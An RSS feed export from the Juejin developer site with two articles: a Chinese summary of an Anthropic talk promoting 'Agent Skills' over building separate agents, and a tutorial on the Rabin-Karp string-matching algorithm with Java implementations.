<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[为什么Anthropic说：AI的未来是Skills不是Agent？]]></title>    <link>https://juejin.cn/post/7584094504631320585</link>    <guid>https://juejin.cn/post/7584094504631320585</guid>    <pubDate>2025-12-16T07:05:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584094504631320585" data-draft-id="7584110439932493870" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么Anthropic说：AI的未来是Skills不是Agent？"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-12-16T07:05:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智泊AI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么Anthropic说：AI的未来是Skills不是Agent？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智泊AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:05:53.000Z" title="Tue Dec 16 2025 07:05:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着AI智能体（Agent）技术的快速演进，当前开发领域普遍存在一种认知偏差：针对不同细分场景和具体用例，开发者倾向于从零开始创建独立的Agent。</p>
<p>Anthropic公司的Barry Zhang与Mahesh Murag在近期演讲中颠覆了这一传统思路，他们倡导的创新方法论明确指出："聚焦技能（Skills）开发，而非重复构建Agent"。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a39bf72f6ca941b2a8cc9e9a7eb01619~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766473553&amp;x-signature=L71%2FNj5gFKWq%2FLTXU5ueG14KPJc%3D" alt="图片" loading="lazy"/></p>
<p><strong>1. 现有的问题：通用智能 vs. 领域专长</strong></p>
<p>当前AI Agent虽具备卓越的智商与通用能力，却普遍存在‌领域专业知识（Expertise）‌的短板。</p>
<p>演讲者通过类比说明：解决税务问题时，人们需要的是精通税务的专家（Barry），而非即便智商高达300却需从零研读税法的数学天才（Mahesh）。</p>
<p>现有Agent恰似后者，若无专业背景与指导支持，在具体任务中难以达到理想表现。</p>
<p><strong>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</strong></p>
<p><strong>2. 什么是"Agent Skills"？</strong></p>
<p><strong>问题解决方案‌</strong>：Anthropic 创新性地开发了 Agent Skills（智能体技能）框架。</p>
<p><strong>‌核心定义‌</strong>：将程序性知识封装为标准化单元，其底层逻辑与文件夹结构一致。</p>
<p><strong>‌模块组成‌</strong>：</p>
<p>提示词（Prompts）、执行脚本（Scripts）、配套说明文档</p>
<p><strong>‌设计优势‌</strong>：</p>
<p>‌直观性‌：采用文件系统架构，天然适配Git版本控制、Google Drive协作等现有工作流</p>
<p>‌扩展性‌：支持通过代码脚本实现工具功能，利用代码的自文档化和可迭代特性，显著提升指令执行精度</p>
<p><strong>3. 运作机制：节省上下文窗口</strong></p>
<p>为避免Agent在掌握数百项技能时超出上下文窗口（Context Window）的容量限制，Anthropic创新性地引入了渐进式披露（Progressive Disclosure）机制。</p>
<p>该机制下，模型在初始运行阶段仅能访问技能的元数据（Metadata），待Agent主动调用特定技能后，才会进一步加载其完整指令与相关文件内容。</p>
<p><strong>4. 蓬勃发展的生态系统</strong></p>
<p>自发布以来，技能生态系统已形成三大核心类别：</p>
<p><strong>‌基础技能‌</strong></p>
<p>为Agent提供通用功能支持，包括Office文档处理及科研任务执行（例如生物信息学数据分析场景）。</p>
<p><strong>‌合作伙伴技能‌</strong></p>
<p>实现第三方工具的无缝整合。典型案例：Notion开发了帮助Claude深度解析工作区数据的技能；Browserbase则提供了浏览器自动化操作技能。</p>
<p><strong>‌企业内部技能‌</strong></p>
<p>当前发展最迅猛的领域。头部企业正通过定制化技能训练Agent，使其适配内部代码规范、操作专属软件或完成特定财务流程。</p>
<p><strong>5. 面向未来的架构：MCP + Skills</strong></p>
<p>Anthropic 提出了一种明确的通用智能体架构框架：</p>
<p>‌Agent Loop‌：负责调控模型的推理流程</p>
<p>‌Runtime 环境‌：集成文件管理与代码运行功能</p>
<p>‌MCP (Model Context Protocol)‌：作为对接外部数据与工具的接口（实现系统与外部交互的核心通道）</p>
<p>‌Skills‌：封装领域专业知识库（智能体的认知储备）</p>
<p>该设计使得业务专家（如财务/法务人员）能够通过配置基础技能模块来增强AI的功能边界。</p>
<p><strong>6. 终极愿景：自我进化的知识库</strong></p>
<p>最让人期待的突破在于AI的进化能力。‌</p>
<p>Claude已具备自主创建技能的功能。例如，当它掌握了一项新任务（如撰写特定风格的PPT脚本），能够将该能力封装为可复用的"技能"模块。</p>
<p>这种机制使"经验积累"转化为实体化资产。通过持续的技能迭代，第30天的Claude将展现出远超初始版本的能力维度。</p>
<p><strong>总结</strong></p>
<p>演讲结尾通过计算机演进史构建了一个巧妙比喻：</p>
<p>‌模型 (Model)‌ 如同 ‌处理器 (Processor)‌：具备惊人潜力却难以独立发挥作用。</p>
<p>‌Runtime/Agent‌ 则类比 ‌操作系统 (OS)‌：核心职能在于资源协调与界面管理。</p>
<p>而 ‌技能 (Skills)‌ 恰似 ‌应用程序 (Software)‌：真正体现专业价值、实现具体功能的载体。</p>
<p>当前更应聚焦开发多元化的"应用程序"（Skills），而非重复构建基础"操作系统"（Agent）。</p>
<p><strong>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[字符串匹配算法]]></title>    <link>https://juejin.cn/post/7584243498527080448</link>    <guid>https://juejin.cn/post/7584243498527080448</guid>    <pubDate>2025-12-16T07:05:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527080448" data-draft-id="7584243498527031296" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="字符串匹配算法"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:05:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            字符串匹配算法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:05:16.000Z" title="Tue Dec 16 2025 07:05:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Rabin-Karp算法</h2>
<p>Rabin-Karp算法是一种<strong>基于哈希函数的字符串匹配算法</strong>，由 Michael O. Rabin 和 Richard M. Karp 于1987年提出，核心思想是用<strong>哈希函数</strong>将模式串和文本串中的子串转换为数值进行比较，避免大量不必要的字符比较。这个算法特别适合<strong>多模式串匹配场景</strong>，时间复杂度平均为O(n+m)，n是文本串长度，m是模式串长度。</p>
<p>Rabin-Karp算法的关键在于使用<strong>滚动哈希函数</strong>（Rolling Hash），它可以在常数时间内计算出滑动窗口的新哈希值，保证算法在大多数情况下的高效性。</p>
<h3 data-id="heading-1">算法步骤</h3>
<ol>
<li>
<p>计算模式串的哈希值</p>
</li>
<li>
<p>计算文本串中长度为m的第一个子串的哈希值（m为模式串长度）</p>
</li>
<li>
<p>在文本串上滑动窗口，对于每个位置：</p>
<ul>
<li>使用滚动哈希技术高效计算当前窗口的哈希值</li>
<li>如果哈希值与模式串相等，则进行字符逐一比较以避免哈希冲突</li>
<li>如果完全匹配，则找到一个匹配位置</li>
</ul>
</li>
<li>
<p>重复步骤3，直到处理完整个文本串</p>
</li>
</ol>
<p>核心特性</p>
<ul>
<li><strong>基于哈希比较</strong>：通过哈希值比较代替直接字符比较</li>
<li><strong>滚动哈希</strong>：O(1)时间复杂度计算下一窗口的哈希值</li>
<li><strong>时间复杂度</strong>：平均情况O(n+m)，最坏情况O(n*m)</li>
<li><strong>空间复杂度</strong>：O(1)，只需常数额外空间</li>
<li><strong>适用范围</strong>：单模式和多模式串匹配场景，特别是多模式匹配</li>
</ul>
<h3 data-id="heading-2">基础实现</h3>
<p>接下来大家一起看下Rabin-Karp算法的部分主流语言实现：</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class RabinKarp {
    private final static int <span class="hljs-attr">PRIME</span> = <span class="hljs-number">101</span><span class="hljs-comment">; // 哈希计算使用的质数</span>
    
    public static int search(String text, String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        // 计算哈希乘数，等于d^(m-1) % PRIME，用于滚动哈希计算
        int <span class="hljs-attr">h</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m - 1; i++) {</span>
            <span class="hljs-attr">h</span> = (h * <span class="hljs-number">256</span>) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 计算模式串和第一个窗口的哈希值
        int <span class="hljs-attr">patternHash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        int <span class="hljs-attr">textHash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            <span class="hljs-attr">patternHash</span> = (<span class="hljs-number">256</span> * patternHash + pattern.charAt(i)) % PRIME<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * textHash + text.charAt(i)) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，比较哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i++) {</span>
            // 哈希值相等时，检查是否真正匹配
            if (<span class="hljs-attr">patternHash</span> == textHash) {
                boolean <span class="hljs-attr">match</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
                    if (text.charAt(i + j) != pattern.charAt(j)) {
                        <span class="hljs-attr">match</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                        break<span class="hljs-comment">;</span>
                    }
                }
                if (match) {
                    return i<span class="hljs-comment">; // 找到匹配</span>
                }
            }
            
            // 计算下一个窗口的哈希值
            if (i &lt; n - m) {
                <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * (textHash - text.charAt(i) * h) + text.charAt(i + m)) % PRIME<span class="hljs-comment">;</span>
                // 处理负数哈希值
                if (textHash &lt; 0) {
                    textHash += PRIME<span class="hljs-comment">;</span>
                }
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
    
    // 打印结果
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"ABABCABABDABACDABABCABAB"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"ABABCABAB"</span><span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">position</span> = search(text, pattern)<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">position</span> == -<span class="hljs-number">1</span>) {
            System.out.println("未找到匹配")<span class="hljs-comment">;</span>
        } else {
            System.out.println("模式串在位置 " + position + " 处匹配")<span class="hljs-comment">;</span>
            System.out.println(text)<span class="hljs-comment">;</span>
            // 打印指示匹配位置的指针
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; position; i++) {</span>
                System.out.print(" ")<span class="hljs-comment">;</span>
            }
            System.out.println(pattern)<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-3">优化：使用更好的哈希函数</h3>
<p>比如使用更复杂的哈希函数来减少冲突</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class ImprovedRabinKarp {
    private final static long <span class="hljs-attr">PRIME1</span> = <span class="hljs-number">1000000007</span><span class="hljs-comment">; // 第一个哈希的质数</span>
    private final static long <span class="hljs-attr">PRIME2</span> = <span class="hljs-number">1000000009</span><span class="hljs-comment">; // 第二个哈希的质数</span>
    
    // 使用双哈希来减少冲突
    public static int search(String text, String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        // 计算哈希乘数
        long <span class="hljs-attr">h1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">h2</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m - 1; i++) {</span>
            <span class="hljs-attr">h1</span> = (h1 * <span class="hljs-number">256</span>) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">h2</span> = (h2 * <span class="hljs-number">256</span>) % PRIME2<span class="hljs-comment">;</span>
        }
        
        // 计算模式串和第一个窗口的哈希值
        long <span class="hljs-attr">patternHash1</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">patternHash2</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">textHash1</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">textHash2</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            <span class="hljs-attr">patternHash1</span> = (<span class="hljs-number">256</span> * patternHash1 + pattern.charAt(i)) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">patternHash2</span> = (<span class="hljs-number">256</span> * patternHash2 + pattern.charAt(i)) % PRIME2<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash1</span> = (<span class="hljs-number">256</span> * textHash1 + text.charAt(i)) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash2</span> = (<span class="hljs-number">256</span> * textHash2 + text.charAt(i)) % PRIME2<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，比较哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i++) {</span>
            // 两个哈希都相等时，再进行字符比较
            if (<span class="hljs-attr">patternHash1</span> == textHash1 &amp;&amp; patternHash2 == textHash2) {
                boolean <span class="hljs-attr">match</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
                    if (text.charAt(i + j) != pattern.charAt(j)) {
                        <span class="hljs-attr">match</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                        break<span class="hljs-comment">;</span>
                    }
                }
                if (match) {
                    return i<span class="hljs-comment">; // 找到匹配</span>
                }
            }
            
            // 计算下一个窗口的哈希值
            if (i &lt; n - m) {
                <span class="hljs-attr">textHash1</span> = (<span class="hljs-number">256</span> * (textHash1 - text.charAt(i) * h1) + text.charAt(i + m)) % PRIME1<span class="hljs-comment">;</span>
                <span class="hljs-attr">textHash2</span> = (<span class="hljs-number">256</span> * (textHash2 - text.charAt(i) * h2) + text.charAt(i + m)) % PRIME2<span class="hljs-comment">;</span>
                
                // 处理负数哈希值
                if (textHash1 &lt; 0) textHash1 += PRIME1<span class="hljs-comment">;</span>
                if (textHash2 &lt; 0) textHash2 += PRIME2<span class="hljs-comment">;</span>
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-4">优点</h3>
<ul>
<li>平均情况下时间复杂度为O(n+m)，接近线性时间</li>
<li>在多模式匹配场景下效率高</li>
<li>可以通过预处理模式串提高效率</li>
<li>滚动哈希计算使得算法高效移动窗口</li>
<li>实现相对简单，原理容易理解</li>
</ul>
<h3 data-id="heading-5">缺点</h3>
<ul>
<li>哈希冲突可能导致额外的字符比较</li>
<li>最坏情况下的时间复杂度为O(n*m)</li>
<li>哈希函数的选择对算法性能影响很大</li>
<li>需要注意数值溢出问题</li>
<li>对于短模式串和文本串，预处理开销可能抵消算法优势</li>
</ul>
<h3 data-id="heading-6">应用场景</h3>
<p>1）文档相似度检测和抄袭检测<br/>
2）网络安全中的特征码匹配<br/>
3）多模式字符串搜索引擎<br/>
4）编译器中的词法分析器</p>
